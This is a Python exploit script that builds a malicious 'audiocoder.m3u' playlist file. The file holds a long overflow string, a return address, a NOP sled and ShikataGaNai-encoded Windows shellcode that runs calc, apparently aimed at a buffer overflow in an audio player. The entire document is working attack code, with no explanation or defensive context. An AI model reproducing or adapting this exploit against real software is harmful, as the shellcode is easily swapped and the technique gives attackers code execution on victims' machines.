# !/usr/bin/python
 
header = "http://"
junk = "\x41" * 249
junk+= "\x53\x93\x42\x7E"
junk+= "\x90" * 16
 
#win32_exec -  EXITFUNC=process CMD=calc Size=161 Encoder=ShikataGaNai
junk+=("\xb8\xe2\x59\x26\xe6\x33\xc9\xda\xdd\xb1\x51\xd9\x74\x24\xf4\x5e"
"\x31\x46\x10\x83\xc6\x04\x03\xa4\x55\xc4\x13\xd4\x0c\xe3\x91\xcc"
"\x28\x0c\xd6\xf3\xab\x78\x45\x2f\x08\xf4\xd3\x13\xdb\x76\xd9\x13"
"\xda\x69\x6a\xac\xc4\xfe\x32\x12\xf4\xeb\x84\xd9\xc2\x60\x17\x33"
"\x1b\xb7\x81\x67\xd8\xf7\xc6\x70\x20\x3d\x2b\x7f\x60\x29\xc0\x44"
"\x30\x8a\x01\xcf\x5d\x59\x0e\x0b\x9f\xb5\xd7\xd8\x93\x02\x93\x81"
"\xb7\x95\x48\x3e\xe4\x1e\x07\x2c\xd0\x3c\x79\x6f\x29\xe6\x1d\xe4"
"\x09\x28\x55\xba\x81\xc3\x19\x26\x37\x58\x99\x5e\x19\x37\x94\x10"
"\xab\x2b\xf8\x53\x65\xd5\xaa\xcd\xe2\x29\x7f\x79\x84\x3e\x4d\x26"
"\x3e\x3e\x61\xb0\x75\x2d\x7e\x7b\xda\x51\xa9\x24\x53\x48\x30\x5b"
"\x8e\x9b\xbf\x0e\x3b\x9e\x40\x60\xd3\x47\xb7\x75\x89\x2f\x37\xa3"
"\x81\x9c\x94\x18\x75\x60\x48\xdd\x2a\x99\xbe\x87\xa4\x74\x63\x21"
"\x66\xfe\x7a\x38\xe0\xa4\x67\x32\x36\xf3\x68\x64\xd2\xec\xc7\xdd"
"\xdc\xdd\x80\x79\x8f\xf0\xb9\xd6\x2f\xda\x69\x8d\x30\x33\xe5\xc8"
"\x86\x32\xbf\x45\xe6\xed\x10\x3d\x4c\x47\x6e\x6d\xff\x0f\x77\xf4"
"\xc6\xa9\x20\xf9\x11\x1c\x30\xd5\xf8\xf5\xaa\xb3\x6c\x69\x5e\xb2"
"\x88\x07\xf0\x9d\x7b\x14\x79\xfa\x16\xe0\xf3\xe6\xd6\x28\xf0\x4c"
"\xe6\xeb\xda\x6e\x55\xc0\xb7\x03\x20\x20\x13\xb0\x7e\x38\x11\x38"
"\x33\xaf\x2a\xb1\x70\x2f\x02\x62\x2e\x9d\xfa\xc5\x81\x4b\xfc\xb4"
"\x70\xd9\xaf\xc9\xa3\x89\xe2\xec\x41\x84\xae\xf1\x9c\x72\xae\xf2"
"\x16\x7c\x80\x87\x0e\x7e\xa2\x53\xd4\x81\x73\x09\xea\xae\x14\xd3"
"\xcc\xad\x96\x78\x12\xe7\xa6\xae")
file = open("audiocoder.m3u" , "w")
file.write(header+junk)
file.close()


